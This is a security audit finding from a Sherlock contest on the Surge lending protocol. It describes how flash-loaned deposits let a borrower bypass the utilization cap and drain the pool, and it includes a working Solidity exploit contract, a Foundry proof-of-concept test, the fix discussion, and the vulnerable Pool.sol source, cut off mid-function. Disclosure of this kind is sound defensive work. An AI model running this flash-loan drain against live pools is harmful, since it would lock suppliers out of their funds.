{
  "Title": "M-2: Users can borrow all loan tokens",
  "Content": "# Issue M-2: Users can borrow all loan tokens \n\nSource: https://github.com/sherlock-audit/2023-02-surge-judging/issues/106 \n\n## Found by \nshaka\n## Summary\n\nUtilization rate check can be bypassed depositing additional loan tokens and withdrawing them in the same transaction.\n\n## Vulnerability Detail\n\nIn the `borrow` function it is checked that the new utilization ratio will not be higher than the _surge threshold_. This threshold prevents borrowers from draining all available liquidity from the pool and also trigger the _surge state_, which lowers the collateral ratio. \n\nA user can bypass this and borrow all available loan tokens following these steps: \n- Depositing the required amount of loan tokens in order to increase the balance of the pool.\n- Borrow the remaining loan tokens from the pool.\n- Withdraw the loan tokens deposited in the first step.\n\nThis can be done in one transaction and the result will be a utilization rate of 100%. Even if the liquidity of the pool is high, the required loan tokens to perform the strategy can be borrowed using a flash loan.\n\n## Impact\n\nThe vulnerability allows to drain all the liquidity from the pool, which entails two problems:\n- The collateral ratio starts decreasing and only stops if the utilization ratio goes back to the surge threshold.\n- The suppliers will not be able to withdraw their tokens. \n\nThe vulnerability can be executed by the same or other actors every time a loan is repaid or a new deposit is done, tracking the mempool and borrowing any new amount of loan tokens available in the pool, until the collateral ratio reaches a value of zero.\n\nA clear case with economic incentives to perform this attack would be that the collateral token drops its price at a high rate and borrow all the available loan tokens from the pool, leaving all suppliers without the chance of withdrawing their share.\n\n## Code Snippet\nhttps://github.com/Surge-fi/surge-protocol-v1/blob/b7cb1dc2a2dcb4bf22c765a4222d7520843187c6/src/Pool.sol#L477-L478\n\n## Proof of concept\n\nHelper contract:\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.17;\n\nimport { FlashBorrower, Flashloan, IERC20Token } from \"./FlashLoan.sol\";\nimport { Pool } from \"./../../src/Pool.sol\";\n\ncontract Borrower is FlashBorrower {\n    address public immutable owner;\n    Flashloan public immutable flashLoan;\n    Pool public immutable pool;\n    IERC20Token public loanToken;\n\n    constructor(Flashloan _flashLoan, Pool _pool) {\n        owner = msg.sender;\n        flashLoan = _flashLoan;\n        pool = _pool;\n        loanToken = IERC20Token(address(_pool.LOAN_TOKEN()));\n    }\n\n    function borrowAll() public returns (bool) {\n        // Get current values from pool\n        pool.withdraw(0);\n        uint loanTokenBalance = loanToken.balanceOf(address(pool));\n        loanToken.approve(address(pool), loanTokenBalance);\n\n        // Execute flash loan\n        flashLoan.execute(FlashBorrower(address(this)), loanToken, loanTokenBalance, abi.encode(loanTokenBalance));\n    }\n\n    function onFlashLoan(IERC20Token token, uint amount, bytes calldata data) public override {\n        // Decode data\n        (uint loanTokenBalance) = abi.decode(data, (uint));\n\n        // Deposit tokens borrowed from flash loan, borrow all other LOAN tokens from pool and\n        // withdraw the deposited tokens\n        pool.deposit(amount);\n        pool.borrow(loanTokenBalance);\n        pool.withdraw(amount);\n\n        // Repay the loan\n        token.transfer(address(flashLoan), amount);\n\n        // Send loan tokens to owner\n        loanToken.transfer(owner, loanTokenBalance);\n    }\n}\n```\n\nExecution:\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.17;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Pool.sol\";\nimport \"../src/Factory.sol\";\nimport \"./mocks/Borrower.sol\";\nimport \"./mocks/ERC20.sol\";\n\ncontract PoC is Test {\n    address alice = vm.addr(0x1);\n    address bob = vm.addr(0x2);\n    Factory factory;\n    Pool pool;\n    Borrower borrower;\n    Flashloan flashLoan;\n    MockERC20 collateralToken;\n    MockERC20 loanToken;\n    uint maxCollateralRatioMantissa;\n    uint surgeMantissa;\n    uint collateralRatioFallDuration;\n    uint collateralRatioRecoveryDuration;\n    uint minRateMantissa;\n    uint surgeRateMantissa;\n    uint maxRateMantissa;\n\n    function setUp() public {\n        factory = new Factory(address(this), \"G\");\n        flashLoan = new Flashloan();\n        collateralToken = new MockERC20(1 ether, 18);\n        collateralToken.transfer(bob, 1 ether);\n        loanToken = new MockERC20(100 ether, 18);\n        loanToken.transfer(alice, 1 ether);\n        loanToken.transfer(address(flashLoan), 99 ether);\n        maxCollateralRatioMantissa = 1e18;\n        surgeMantissa = 0.8e18; // 80%\n        pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), maxCollateralRatioMantissa, surgeMantissa, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);\n    }\n\n    function testFailBorrowAll() external {\n        // Alice deposits 1 LOAN token\n        vm.startPrank(alice);\n        loanToken.approve(address(pool), 1 ether);\n        pool.deposit(1 ether);\n        vm.stopPrank();\n\n        // Bob tries to borrow all available loan tokens\n        vm.startPrank(bob);\n        collateralToken.approve(address(pool), 1 ether);\n        pool.addCollateral(bob, 1 ether);\n        pool.borrow(1 ether);\n        vm.stopPrank();\n    }\n\n    function testBypassUtilizationRate() external {\n        uint balanceBefore = loanToken.balanceOf(bob);\n\n        // Alice deposits 1 LOAN token\n        vm.startPrank(alice);\n        loanToken.approve(address(pool), 1 ether);\n        pool.deposit(1 ether);\n        vm.stopPrank();\n\n        // Bob tries to borrow all available loan tokens\n        vm.startPrank(bob);\n        collateralToken.approve(address(pool), 1 ether);\n        borrower = new Borrower(flashLoan, pool);\n        pool.addCollateral(address(borrower), 1 ether);\n        borrower.borrowAll();\n        vm.stopPrank();\n\n        assertEq(loanToken.balanceOf(bob) - balanceBefore, 1 ether);\n    }\n}\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nA possible solution would be adding a locking period for deposits of loan tokens.\n\nAnother possibility is to enforce that the utilization rate was under the surge rate also in the previous snapshot.\n\n\n\n## Discussion\n\n**xeious**\n\nRecommending medium severity because there's no direct loss of funds. We're thinking of solving this by forbidding deposits and withdrawals in a single block.\n\n**xeious**\n\nFixed https://github.com/Surge-fi/surge-protocol-v1/commit/9492d0355dc273b566329dfdc9979566d166bddf\n\n**IAm0x52**\n\nSeems like the reported behavior is inherent to this model of lending. The provided fix doesn't make this behavior impossible, only more difficult because the user can no longer utilize flash loans\n\n**xeious**\n\nUpdated https://github.com/Surge-fi/surge-protocol-v1/commit/67eb775ec5e30525684ce9e8250019a5dae8f915\n\n**IAm0x52**\n\nUpdated fix looks good. Deposits now lock for a much longer time which heavily disincentivizes an attack like this.\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/51",
  "Code": [
    {
      "filename": "src/Pool.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.17;\n\ninterface IERC20 {\n    function balanceOf(address) external view returns(uint);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);\n    function transfer(address, uint) external returns (bool);\n    function decimals() external view returns (uint8);\n}\n\ninterface IFactory {\n    function getFee() external view returns (address to, uint feeMantissa);\n}\n\n/// @title Pool\n/// @author Moaz Mohsen & Nour Haridy\n/// @notice A Surge lending pool for a single collateral and loan token pair\n/// @dev This contract asssumes that the collateral and loan tokens are valid non-rebasing ERC20-compliant tokens\ncontract Pool {\n\n    IFactory public immutable FACTORY;\n    IERC20 public immutable COLLATERAL_TOKEN;\n    IERC20 public immutable LOAN_TOKEN;\n    string public symbol;\n    string public name;\n    uint8 public constant decimals = 18;\n    uint private constant RATE_CEILING = 100e18; // 10,000% borrow APR\n    uint public immutable MIN_RATE;\n    uint public immutable SURGE_RATE;\n    uint public immutable MAX_RATE;\n    uint public immutable MAX_COLLATERAL_RATIO_MANTISSA;\n    uint public immutable SURGE_MANTISSA;\n    uint public immutable COLLATERAL_RATIO_FALL_DURATION;\n    uint public immutable COLLATERAL_RATIO_RECOVERY_DURATION;\n    bytes4 private constant TRANSFER_SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));\n    bytes4 private constant TRANSFER_FROM_SELECTOR = bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n    uint public lastCollateralRatioMantissa;\n    uint public debtSharesSupply;\n    mapping (address => uint) public debtSharesBalanceOf;\n    uint public lastTotalDebt;\n    uint public lastAccrueInterestTime;\n    uint public totalSupply;\n    mapping (address => mapping (address => uint)) public allowance;\n    mapping (address => uint) public balanceOf;\n    mapping (address => uint) public collateralBalanceOf;\n\n    constructor(\n        string memory _symbol,\n        string memory _name,\n        IERC20 _collateralToken,\n        IERC20 _loanToken,\n        uint _maxCollateralRatioMantissa,\n        uint _surgeMantissa,\n        uint _collateralRatioFallDuration,\n        uint _collateralRatioRecoveryDuration,\n        uint _minRateMantissa,\n        uint _surgeRateMantissa,\n        uint _maxRateMantissa\n    ) {\n        require(_collateralToken != _loanToken, \"Pool: collateral and loan tokens are the same\");\n        require(_collateralRatioFallDuration > 0, \"Pool: _collateralRatioFallDuration too low\");\n        require(_collateralRatioRecoveryDuration > 0, \"Pool: _collateralRatioRecoveryDuration too low\");\n        require(_maxCollateralRatioMantissa > 0, \"Pool: _maxCollateralRatioMantissa too low\");\n        require(_surgeMantissa < 1e18, \"Pool: _surgeMantissa too high\");\n        require(_minRateMantissa <= _surgeRateMantissa, \"Pool: _minRateMantissa too high\");\n        require(_surgeRateMantissa <= _maxRateMantissa, \"Pool: _surgeRateMantissa too high\");\n        require(_maxRateMantissa <= RATE_CEILING, \"Pool: _maxRateMantissa too high\");\n        symbol = _symbol;\n        name = _name;\n        FACTORY = IFactory(msg.sender);\n        COLLATERAL_TOKEN = _collateralToken;\n        LOAN_TOKEN = _loanToken;\n        MAX_COLLATERAL_RATIO_MANTISSA = _maxCollateralRatioMantissa;\n        SURGE_MANTISSA = _surgeMantissa;\n        COLLATERAL_RATIO_FALL_DURATION = _collateralRatioFallDuration;\n        COLLATERAL_RATIO_RECOVERY_DURATION = _collateralRatioRecoveryDuration;\n        lastCollateralRatioMantissa = _maxCollateralRatioMantissa;\n        MIN_RATE = _minRateMantissa;\n        SURGE_RATE = _surgeRateMantissa;\n        MAX_RATE = _maxRateMantissa;\n    }\n\n    function safeTransfer(IERC20 token, address to, uint value) internal {\n        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(TRANSFER_SELECTOR, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'Pool: TRANSFER_FAILED');\n    }\n\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\n        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(TRANSFER_FROM_SELECTOR, from, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'Pool: TRANSFER_FROM_FAILED');\n    }\n\n    /// @notice Gets the current state of pool variables based on the current time\n    /// @param _loanTokenBalance The current balance of the loan token in the pool\n    /// @param _feeMantissa The fee to be charged on interest accrual\n    /// @param _lastCollateralRatioMantissa The collateral ratio at the last interest accrual\n    /// @param _totalSupply The total supply of pool tokens at the last interest accrual\n    /// @param _lastAccrueInterestTime The last time interest was accrued\n    /// @param _totalDebt The total debt of the pool at the last interest accrual\n    /// @return _currentTotalSupply The current total supply of pool tokens\n    /// @return _accruedFeeShares The accrued fee shares to be transferred to the fee recipient\n    /// @return _currentCollateralRatioMantissa The current collateral ratio\n    /// @return _currentTotalDebt The current total debt of the pool\n    /// @dev This view function behaves as a pure function with the exception of immutable variables (which are constant)\n    function getCurrentState(\n        uint _loanTokenBalance,\n        uint _feeMantissa,\n        uint _lastCollateralRatioMantissa,\n        uint _totalSupply,\n        uint _lastAccrueInterestTime,\n        uint _totalDebt\n        ) internal view returns (\n            uint _currentTotalSupply,\n            uint _accruedFeeShares,\n            uint _currentCollateralRatioMantissa,\n            uint _currentTotalDebt\n        ) {\n        \n        // 1. Set default return values\n        _currentTotalSupply = _totalSupply;\n        _currentTotalDebt = _totalDebt;\n        _currentCollateralRatioMantissa = _lastCollateralRatioMantissa;\n        // _accruedFeeShares = 0;\n\n        // 2. Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - _lastAccrueInterestTime;\n        \n        // 3. If the time passed is 0, return the current values\n        if(_timeDelta == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n        \n        // 4. Calculate the supplied value\n        uint _supplied = _totalDebt + _loanTokenBalance;\n        // 5. Calculate the utilization\n        uint _util = getUtilizationMantissa(_totalDebt, _supplied);\n\n        // 6. Calculate the collateral ratio\n        _currentCollateralRatioMantissa = getCollateralRatioMantissa(\n            _util,\n            _lastAccrueInterestTime,\n            block.timestamp,\n            _lastCollateralRatioMantissa,\n            COLLATERAL_RATIO_FALL_DURATION,\n            COLLATERAL_RATIO_RECOVERY_DURATION,\n            MAX_COLLATERAL_RATIO_MANTISSA,\n            SURGE_MANTISSA\n        );\n\n        // 7. If there is no debt, return the current values\n        if(_totalDebt == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n\n        // 8. Calculate the borrow rate\n        uint _borrowRate = getBorrowRateMantissa(_util, SURGE_MANTISSA, MIN_RATE, SURGE_RATE, MAX_RATE);\n        // 9. Calculate the interest\n        uint _interest = _totalDebt * _borrowRate * _timeDelta / (365 days * 1e18); // does the optimizer optimize this? or should it be a constant?\n        // 10. Update the total debt\n        _currentTotalDebt += _interest;\n        \n        // 11. If there is no fee, return the current values\n        if(_feeMantissa == 0) return (_currentTotalSupply, _accruedFeeShares, _currentCollateralRatioMantissa, _currentTotalDebt);\n        // 12. Calculate the fee\n        uint fee = _interest * _feeMantissa / 1e18;\n        // 13. Calculate the accrued fee shares\n        _accruedFeeShares = fee * _totalSupply / _supplied; // if supplied is 0, we will have returned at step 7\n        // 14. Update the total supply\n        _currentTotalSupply += _accruedFeeShares;\n    }\n\n    /// @notice Gets the current borrow rate in mantissa (scaled by 1e18)\n    /// @param _util The utilization in mantissa (scaled by 1e18)\n    /// @param _surgeMantissa The utilization at which the borrow rate will be at the surge rate in mantissa (scaled by 1e18)\n    /// @param _minRateMantissa The minimum borrow rate at 0% utilization in mantissa (scaled by 1e18)\n    /// @param _surgeRateMantissa The borrow rate at the surge utilization in mantissa (scaled by 1e18)\n    /// @param _maxRateMantissa The maximum borrow rate at 100% utilization in mantissa (scaled by 1e18)\n    /// @return uint The borrow rate in mantissa (scaled by 1e18)\n    function getBorrowRateMantissa(uint _util, uint _surgeMantissa, uint _minRateMantissa, uint _surgeRateMantissa, uint _maxRateMantissa) internal pure returns (uint) {\n        if(_util <= _surgeMantissa) {\n            return (_surgeRateMantissa - _minRateMantissa) * 1e18 * _util / _surgeMantissa / 1e18 + _minRateMantissa; // is this optimized by the optimized?\n        } else {\n            uint excessUtil = _util - _surgeMantissa;\n            return (_maxRateMantissa - _surgeRateMantissa) * 1e18 * excessUtil / (1e18 - _surgeMantissa) / 1e18 + _surgeRateMantissa; // is this optimized by the optimizer?\n        }\n    }\n\n    /// @notice Gets the current pool utilization rate in mantissa (scaled by 1e18)\n    /// @param _totalDebt The total debt of the pool\n    /// @param _supplied The total supplied loan tokens of the pool\n    /// @return uint The pool utilization rate in mantissa (scaled by 1e18)\n    function getUtilizationMantissa(uint _totalDebt, uint _supplied) internal pure returns (uint) {\n        if(_supplied == 0) return 0;\n        return _totalDebt * 1e18 / _supplied;\n    }\n\n    /// @notice Converts a loan token amount to shares\n    /// @param _tokenAmount The loan token amount to convert\n    /// @param _supplied The total supplied loan tokens of the pool\n    /// @param _sharesTotalSupply The total supply of shares of the pool\n    /// @param roundUpCheck Whether to check and round up the shares amount\n    /// @return uint The shares amount\n    function tokenToShares (uint _tokenAmount, uint _supplied, uint _sharesTotalSupply, bool roundUpCheck) internal pure returns (uint) {\n        if(_supplied == 0) return _tokenAmount;\n        uint shares = _tokenAmount * _sharesTotalSupply / _supplied;\n        if(roundUpCheck && shares * _supplied < _tokenAmount * _sharesTotalSupply) shares++;\n        return shares;\n    }\n\n    /// @notice Gets the pool collateral ratio in mantissa (scaled by 1e18)\n    /// @param _util The utilization in mantissa (scaled by 1e18)\n    /// @param _lastAccrueInterestTime The last time the pool accrued interest\n    /// @param _now The current time\n    /// @param _lastCollateralRatioMantissa The last collateral ratio of the pool in mantissa (scaled by 1e18)\n    /// @param _collateralRatioFallDuration The duration of the collateral ratio fall from max to 0 in seconds\n    /// @param _collateralRatioRecoveryDuration The duration of the collateral ratio recovery from 0 to max in seconds\n    /// @param _maxCollateralRatioMantissa The maximum collateral ratio of the pool in mantissa (scaled by 1e18)\n    /// @param _surgeMantissa The utilization at which the surge threshold is triggered in mantissa (scaled by 1e18)\n    /// @return uint The pool collateral ratio in mantissa (scaled by 1e18)\n    function getCollateralRatioMantissa(\n        uint _util,\n        uint _lastAccrueInterestTime,\n        uint _now,\n        uint _lastCollateralRatioMantissa,\n        uint _collateralRatioFallDuration,\n        uint _collateralRatioRecoveryDuration,\n        uint _maxCollateralRatioMantissa,\n        uint _surgeMantissa\n        ) internal pure returns (uint) {\n        unchecked {\n            if(_lastAccrueInterestTime == _now) return _lastCollateralRatioMantissa;\n            \n            // If utilization is less than or equal to surge, we are increasing collateral ratio\n            if(_util <= _surgeMantissa) {\n                // The collateral ratio can only increase if it is less than the max collateral ratio\n                if(_lastCollateralRatioMantissa == _maxCollateralRatioMantissa) return _lastCollateralRatioMantissa;\n\n                // If the collateral ratio can increase, we calculate the increase\n                uint timeDelta = _now - _lastAccrueInterestTime;\n                uint change = timeDelta * _maxCollateralRatioMantissa / _collateralRatioRecoveryDuration;\n\n                // If the change in collateral ratio is greater than the max collateral ratio, we set the collateral ratio to the max collateral ratio\n                if(_lastCollateralRatioMantissa + change >= _maxCollateralRatioMantissa) {\n                    return _maxCollateralRatioMantissa;\n                } else {\n                    // Otherwise we increase the collateral ratio by the change\n                    return _lastCollateralRatioMantissa + change;\n                }\n            } else {\n                // If utilization is greater than the surge, we are decreasing collateral ratio\n                // The collateral ratio can only decrease if it is greater than 0\n                if(_lastCollateralRatioMantissa == 0) return 0;\n\n                // If the collateral ratio can decrease, we calculate the decrease\n                uint timeDelta = _now - _lastAccrueInterestTime;\n                uint change = timeDelta * _maxCollateralRatioMantissa / _collateralRatioFallDuration;\n\n                // If the change in collateral ratio is greater than the collateral ratio, we set the collateral ratio to 0\n                if(_lastCollateralRatioMantissa <= change) {\n                    return 0;\n                } else {\n                    // Otherwise we decrease the collateral ratio by the change\n                    return _lastCollateralRatioMantissa - change;\n                }\n            }\n        }\n    }\n\n    /// @notice Transfers pool tokens to the recipient\n    /// @param to The address of the recipient\n    /// @param amount The amount of pool tokens to transfer\n    /// @return bool that indicates if the operation was successful\n    function transfer(address to, uint amount) external returns (bool) {\n        require(to != address(0), \"Pool: to cannot be address 0\");\n        balanceOf[msg.sender] -= amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    /// @notice Transfers pool tokens on behalf of one address to another\n    /// @param from The address of the sender\n    /// @param to The address of the recipient\n    /// @param amount The amount of pool tokens to transfer\n    /// @return bool that indicates if the operation was successful\n    function transferFrom(address from, address to, uint amount) external returns (bool) {\n        require(to != address(0), \"Pool: to cannot be address 0\");\n        allowance[from][msg.sender] -= amount;\n        balanceOf[from] -= amount;\n        unchecked {\n            balanceOf[to] += amount;\n        }\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    /// @notice Approves an address to spend pool tokens on behalf of the sender\n    /// @param spender The address of the spender\n    /// @param amount The amount of pool tokens to approve\n    /// @return bool that indicates if the operation was successful\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    /// @notice Deposit loan tokens in exchange for pool tokens\n    /// @param amount The amount of loan tokens to deposit\n    function deposit(uint amount) external {\n        uint _loanTokenBalance = LOAN_TOKEN.balanceOf(address(this));\n        (address _feeRecipient, uint _feeMantissa) = FACTORY.getFee();\n        (  \n            uint _currentTotalSupply,\n            uint _accruedFeeShares,\n            uint _currentCollateralRatioMantissa,\n            uint _currentTotalDebt\n        ) = getCurrentState(\n            _loanTokenBalance,\n            _feeMantissa,\n            lastCollateralRatioMantissa,\n            totalSupply,\n            lastAccrueInterestTime,\n            lastTotalDebt\n        );\n\n        uint _shares = tokenToShares(amount, (_currentTotalDebt + _loanTokenBalance), _currentTotalSupply, false);\n        require(_shares > 0, \"Pool: 0 shares\");\n        _currentTotalSupply += _shares;\n\n        // commit current state\n        balanceOf[msg.sender] += _shares;\n        totalSupply = _currentTotalSupply;\n        lastTotalDebt = _currentTotalDebt;\n        lastAccrueInterestTime = block.timestamp;\n        lastCollateralRatioMantissa = _currentCollateralRatioMantissa;\n        emit Invest(msg.sender, amount);\n        emit Transfer(address(0), msg.sender, _shares);\n        if(_accruedFeeShares > 0) {\n            balanceOf[_feeRecipient] += _accruedFeeShares;\n            emit Transfer(address(0), _feeRecipient, _accruedFeeShares);\n        }\n\n        // interactions\n        safeTransferFrom(LOAN_TOKEN, msg.sender, address(this), amount);\n    }\n\n    /// @notice Withdraw loan tokens in exchange for pool tokens\n    /// @param amount The amount of loan tokens to withdraw\n    /// @dev If amount is type(uint).max, withdraws all loan tokens\n    function withdraw(uint amount) external {\n        uint _loanTokenBalance = LOAN_TOKEN.balanceOf(address(this));\n        (address _feeRecipient, uint _feeMantissa) = FACTORY.getFee();\n        (  \n            uint _currentTotalSupply,\n            uint _accruedFeeShares,\n            uint _currentCollateralRatioMantissa,\n            uint _currentTotalDebt\n        ) = getCurrentState(\n            _loanTokenBalance,\n            _feeMantissa,\n            lastCollateralRatioMantissa,\n            totalSupply,\n            lastAccrueInterestTime,\n            lastTotalDebt\n        );\n\n        uint _shares;\n        if (amount == type(uint).max) {\n            amount = balanceOf[msg.sender] * (_currentTotalDebt + _loanTokenBalance) / _currentTotalSupply;\n            _shares = balanceOf[msg.sender];\n        } else {\n            _shares = tokenToShares(amount, (_currentTotalDebt + _loanTokenBalance), _currentTotalSupply, true);\n        }\n        _currentTotalSupply -= _shares;\n\n        // commit current state\n        balanceOf[msg.sender] -= _shares;\n        totalSupply = _currentTotalSupply;\n        lastTotalDebt = _currentTotalDebt;\n        lastAccrueInterestTime = block.timestamp;\n        lastCollateralRatioMantissa = _currentCollateralRatioMantissa;\n        emit Divest(msg.sender, amount);\n        emit Transfer(msg.sender, address(0), _shares);\n        if(_accruedFeeShares > 0) {\n            balanceOf[_feeRecipient] += _accruedFeeShares;\n            emit Transfer(address(0), _feeRecipient, _accruedFeeShares);\n        }\n\n        // interactions\n        safeTransfer(LOAN_TOKEN, msg.sender, amount);\n    }\n\n    /// @notice Deposit collateral tokens\n    /// @param to The address to receive the collateral deposit\n    /// @param amount The amount of collateral tokens to deposit\n    function addCollateral(address to, uint amount) external {\n        collateralBalanceOf[to] += amount;\n        safeTransferFrom(COLLATERAL_TOKEN, msg.sender, address(this), amount);\n        emit Secure(to, msg.sender, amount);\n    }\n\n    /// @notice Gets the debt of a user\n    /// @param _userDebtShares The amount of debt shares of the user\n    /// @param _debtSharesSupply The total amount of debt shares\n    /// @param _totalDebt The total amount of debt\n    /// @return uint The debt of the user\n    function getDebtOf(uint _userDebtShares, uint _debtSharesSupply, uint _totalDebt) internal pure returns (uint) {\n        if (_debtSharesSupply == 0) return 0;\n        uint debt = _userDebtShares * _totalDebt / _debtSharesSupply;\n        if(debt * _debtSharesSupply < _userDebtShares * _totalDebt) debt++;\n        return debt;\n    }\n    \n    /// @notice Withdraw collateral tokens\n    /// @param amount The amount of collateral tokens to withdraw\n    function removeCollateral(uint amount) external {\n        uint _loanTokenBalance = LOAN_TOKEN.balanceOf(address(this));\n        (address _feeRecipient, uint _feeMantissa) = FACTORY.getFee();\n        (  \n            uint _currentTotalSupply,\n            uint _accruedFeeShares,\n            uint _currentCollateralRatioMantissa,\n            uint _currentTotalDebt\n        ) = getCurrentState(\n            _loanTokenBalance,\n            _feeMantissa,\n            lastCollateralRatioMantissa,\n            totalSupply,\n            lastAccrueInterestTime,\n            lastTotalDebt\n        );\n\n        uint userDebt = getDebtOf(debtSharesBalanceOf[msg.sender], debtSharesSupply, _currentTotalDebt);\n        if(userDebt > 0) {\n            uint userCollateralRatioMantissa = userDebt * 1e18 / (collateralBalanceOf[msg.sender] - amount);\n            require(userCollateralRatioMantissa <= _currentCollateralRatioMantissa, \"Pool: user collateral ratio too high\");\n        }\n\n        // commit current state\n        totalSupply = _currentTotalSupply;\n        lastTotalDebt = _currentTotalDebt;\n        lastAccrueInterestTime = block.timestamp;\n        lastCollateralRatioMantissa = _currentCollateralRatioMantissa;\n        collateralBalanceOf[msg.sender] -= amount;\n        emit Unsecure(msg.sender, amount);\n        if(_accruedFeeShares > 0) {\n            balanceOf[_feeRecipient] += _accruedFeeShares;\n            emit Transfer(address(0), _feeRecipient, _accruedFeeShares);\n        }\n\n        // interactions\n        safeTransfer(COLLATERAL_TOKEN, msg.sender, amount);\n    }\n\n    /// @notice Borrow loan tokens\n    /// @param amount The amount of loan tokens to borrow\n    function borrow(uint amount) external {\n        uint _loanTokenBalance = LOAN_TOKEN.balanceOf(address(this));\n        (address _feeRecipient, uint _feeMantissa) = FACTORY.getFee();\n        (  \n            uint _currentTotalSupply,\n            uint _accruedFeeShares,\n            uint _currentCollateralRatioMantissa,\n            uint _currentTotalDebt\n        ) = getCurrentState(\n            _loanTokenBalance,\n            _feeMantissa,\n            lastCollateralRatioMantissa,\n            totalSupply,\n            lastAccrueInterestTime,\n            lastTotalDebt\n        );\n\n        uint _debtSharesSupply = debtSharesSupply;\n        uint userDebt = getDebtOf(debtSharesBalanceOf[msg.sender], _debtSharesSupply, _currentTotalDebt) + amount;\n        uint userCollateralRatioMantissa = userDebt * 1e18 / collateralBalanceOf[msg.sender];\n        require(userCollateralRatioMantissa <= _currentCollateralRatioMantissa, \"Pool: user collateral ratio too high\");\n\n        uint _newUtil = getUtilizationMantissa(_currentTotalDebt + amount, (_currentTotalDebt + _loanTokenBalance));\n        require(_newUtil <= SURGE_MANTISSA, \"Pool: utilization too high\");\n\n        uint _shares = tokenToShares(amount, _currentTotalDebt, _debtSharesSupply, true);\n        _currentTotalDebt += amount;\n\n        // commit current state\n        debtSharesBalanceOf[msg.sender] += _shares;\n        debtSharesSupply = _debtSharesSupply + _shares;\n        totalSupply = _currentTotalSupply;\n        lastTotalDebt = _currentTotalDebt;\n        lastAccrueInterestTime = block.timestamp;\n        lastCollateralRatioMantissa = _currentCollateralRatioMantissa;\n        emit Borrow(msg.sender, amount);\n        if(_accruedFeeShares > 0) {\n            balanceOf[_feeRecipient] += _accruedFeeShares;\n            emit Transfer(address(0), _feeRecipient, _accruedFeeShares);\n        }\n\n        // interactions\n        safeTransfer(LOAN_TOKEN, msg.sender, amount);\n    }\n\n    /// @notice Repay loan tokens debt\n    /// @param borrower The address of the borrower to repay on their behalf\n    /// @param amount The amount of loan tokens to repay\n    /// @dev If amount is max uint, all debt will be repaid\n    function repay(address borrower, uint amount) external {\n        uint _loanTokenBalance = LOAN_TOKEN.balanceOf(address(this));\n        (address _feeRecipient, uint _feeMantissa) = FACTORY.getFee();\n        (  \n            uint _currentTotalSupply,\n            uint _accruedFeeShares,\n            uint _currentCollateralRatioMantissa,\n            uint _currentTotalDebt\n        ) = getCurrentState(\n            _loanTokenBalance,\n            _feeMantissa,\n            lastCollateralRatioMantissa,\n            totalSupply,\n            lastAccrueInterestTime,\n            lastTotalDebt\n        );\n\n        uint _debtSharesSupply = debtSharesSupply;\n\n        uint _shares;\n        if(amount == type(uint).max) {\n            amount = getDebtOf(debtSharesBalanceOf[borrower], _debtSharesSupply, _currentTotalDebt);\n            _shares = debtSharesBalanceOf[borrower];\n        } else {\n            _shares = tokenToShares(amount, _currentTotalDebt, _debtSharesSupply, false);\n        }\n        _currentTotalDebt -= amount;\n\n        // commit current state\n        debtSharesBalanceOf[borrower] -= _shares;\n        debtSharesSupply = _debtSharesSupply - _shares;\n        totalSupply = _currentTotalSupply;\n        lastTotalDebt = _currentTotalDebt;\n        lastAccrueInterestTime = block.timestamp;\n        lastCollateralRatioMantissa = _currentCollateralRatioMantissa;\n        emit Repay(borrower, msg.sender, amount);\n        if(_accruedFeeShares > 0) {\n            balanceOf[_feeRecipient] += _accruedFeeShares;\n            emit Transfer(address(0), _feeRecipient, _accruedFeeShares);\n        }\n\n        // interactions\n        safeTransferFrom(LOAN_TOKEN, msg.sender, address(this), amount);\n    }\n\n    /// @notice Seize collateral from an underwater borrower in exchange for repaying their debt\n    /// @param borrower The address of the borrower to liquidate\n    /// @param amount The amount of debt to repay\n    /// @dev If amount is max uint, all debt will be liquidated\n    function liquidate(address borrower, uint amount) external {\n        uint _loanTokenBalance = LOAN_TOKEN.balanceOf(address(this));\n        (address _feeRecipient, uint _feeMantissa) = FACTORY.getFee();\n        (  \n            uint _currentTotalSupply,\n            uint _accruedFeeShares,\n            uint _currentCollateralRatioMantissa,\n            uint _currentTotalDebt\n        ) = getCurrentState(\n            _loanTokenBalance,\n            _feeMantissa,\n            lastCollateralRatioMantissa,\n            totalSupply,\n            lastAccrueInterestTime,\n            lastTotalDebt\n        );\n\n        uint collateralBalance = collateralBalanceOf[borrower];\n        uint _debtSharesSupply = debtSharesSupply;\n        uint userDebt = getDebtOf(debtSharesBalanceOf[borrower], _debtSharesSupply, _currentTotalDebt);\n        uint userCollateralRatioMantissa = userDebt * 1e18 / collateralBalance;\n        require(userCollateralRatioMantissa > _currentCollateralRatioMantissa, \"Pool: borrower not liquidatable\");\n\n        address _borrower = borrower; // avoid stack too deep\n        uint _amount = amount; // avoid stack too deep\n        uint _shares;\n        uint collateralReward;\n        if(_amount == type(uint).max || _amount == userDebt) {\n            collateralReward = collateralBalance;\n            _shares = debtSharesBalanceOf[_borrower];\n            _amount = userDebt;\n        } else {\n            uint userInvertedCollateralRatioMantissa = collateralBalance * 1e18 / userDebt;\n            collateralReward = _amount * userInvertedCollateralRatioMantissa / 